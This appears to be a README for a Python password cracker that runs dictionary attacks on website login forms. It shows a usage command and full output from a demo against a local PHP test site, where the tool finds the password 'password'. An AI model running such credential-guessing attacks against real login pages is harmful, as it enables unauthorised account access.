# Password Cracker
## Python script for dictionary attacks on websites login forms.

# Usage:
	cd website
	php -S localhost:8000 &
	cd ../cracker
	python cracker.py "http://localhost:8000/" "passes.txt" "username" "submit" "username?password?submit" "Username or password is invalid"
 # Output:
	Data correctly loaded!
	['superstronkpassword', 'toor', 'obsd', '12345678', 'password', '']
	Data correctly prepared!
	[('username', 'username', 'password', 'superstronkpassword', 'submit', 'submit'), ('username', 'username', 'password', 'toor', 'submit', 'submit'), ('username', 'username', 'password',
	'obsd', 'submit', 'submit'), ('username', 'username', 'password', '12345678', 'submit', 'submit'), ('username', 'username', 'password', 'password', 'submit', 'submit'), ('username', 'username', 'password', '', 'submit', 'submit')]
	[ 1/6 ] Sending  ('username', 'username', 'password', 'superstronkpassword', 'submit', 'submit') for http://localhost:8000/
	[ 2/6 ] Sending  ('username', 'username', 'password', 'toor', 'submit', 'submit') for http://localhost:8000/
	[ 3/6 ] Sending  ('username', 'username', 'password', 'obsd', 'submit', 'submit') for http://localhost:8000/
	[ 4/6 ] Sending  ('username', 'username', 'password', '12345678', 'submit', 'submit') for http://localhost:8000/
	[ 5/6 ] Sending  ('username', 'username', 'password', 'password', 'submit', 'submit') for http://localhost:8000/
	Password found!
	Login: username
	Password: password
	[ 6/6 ] Sending  ('username', 'username', 'password', '', 'submit', 'submit') for http://localhost:8000/
